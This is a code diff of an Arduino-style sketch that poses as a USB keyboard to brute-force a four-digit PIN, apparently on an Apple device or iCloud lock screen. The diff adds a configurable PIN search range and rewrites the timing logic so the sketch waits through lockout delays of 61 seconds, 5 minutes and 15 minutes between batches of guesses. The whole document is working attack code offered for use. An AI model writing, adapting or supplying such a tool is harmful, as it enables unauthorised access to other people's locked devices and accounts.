@@ -17,15 +17,14 @@
 // problems this code might cause.
 
 const int ledPin = 13;
-int counter = 0;
+
+///// modify these values to narrow search range. /////
+int startvalue = 0;
+int endvalue = 9999;
+///////////////////////////////////////////////////////
 
 //waits for iCould
-int firstloop = 0;
-int secondloop = 0;
-int thirdloop = 0;
-boolean firstcompleted = false;
-boolean secondcompleted = false;
-int fakecounter = counter;
+int waitloop = 1;
 char pin[]="xxxx";
 
 void setup() {
@@ -36,50 +35,32 @@ void setup() {
 
 void loop(){
   keyboard_modifier_keys = 0;
-  //lets wait 1minute and 1 second
-  if (firstloop >= 5){
-    delay(61000);
-    firstcompleted = true;
-    digitalWrite(ledPin, LOW);
-  }
-  else if ((firstloop < 5) && (firstcompleted == false)){
-    digitalWrite(ledPin, HIGH);
-    ++firstloop;
-    digitalWrite(ledPin, LOW);
-  }
-  //lets wait 5 minutes and one second
-  if ((secondloop >= 1) && (secondcompleted == false) && (firstcompleted == true)){
+    
+  switch (waitloop) {
+  case 1 ... 5: // don't wait the first 5 attempts
+    break;
+  case 6: // wait 61 seconds on sixth try
+    delay(61000); 
+    break;
+  case 7: // wait 5 minutes and 1 second on seventh try
     delay(301000);
-    secondloop = 0;
-    secondcompleted = true;
-    digitalWrite(ledPin, LOW);
-  }
-  else if ((secondloop < 1) && (secondcompleted == false) && (firstcompleted == true)){
-    ++secondloop;
-    digitalWrite(ledPin, LOW);
-  }
-  //lets wait 15 minutes and 1 second
-  if ((thirdloop >= 1) && (secondcompleted == true)){
+    break;
+  case 8: // wait 15 minutes and 1 second on eighth try
     delay(901000);
-    thirdloop = 0;
-    secondcompleted = false;
-    firstcompleted = false;
-    firstloop = 0;
-    secondloop = 0;
-    thirdloop = 0;
+    digitalWrite(ledPin, HIGH);
+    waitloop = 0;
     digitalWrite(ledPin, LOW);
+    break;
   }
-  else if ((thirdloop < 1) && (secondcompleted == true)){
-    ++thirdloop;
-    digitalWrite(ledPin, LOW);
-  }
+
   //lets get to work
-  if (counter <= 9999){
+  if (startvalue <= endvalue) {
     delay(100503);
     digitalWrite(ledPin, LOW);
     delay(7049);
     digitalWrite(ledPin, HIGH);
-    sprintf(pin, "%04d", fakecounter);
+    sprintf(pin, "%04d", startvalue);
+
     Keyboard.press(pin[0]);
     delay(450);
     Keyboard.release(pin[0]);
@@ -101,8 +82,7 @@ void loop(){
     Keyboard.release(KEY_ENTER);
     digitalWrite(ledPin, LOW);
   }
-  //reached 4 digit PIN max value
-  if (counter > 9999){
+  else {
     for (int blinkies = 0; blinkies < 8; blinkies++) {
       digitalWrite(ledPin, HIGH);
       delay(20);
@@ -111,6 +91,9 @@ void loop(){
     }
     delay(6000);
   }
-  ++counter;
-  fakecounter = counter;
+
+  digitalWrite(ledPin, HIGH);
+  ++startvalue;
+  ++waitloop;
+  digitalWrite(ledPin, LOW);
 }
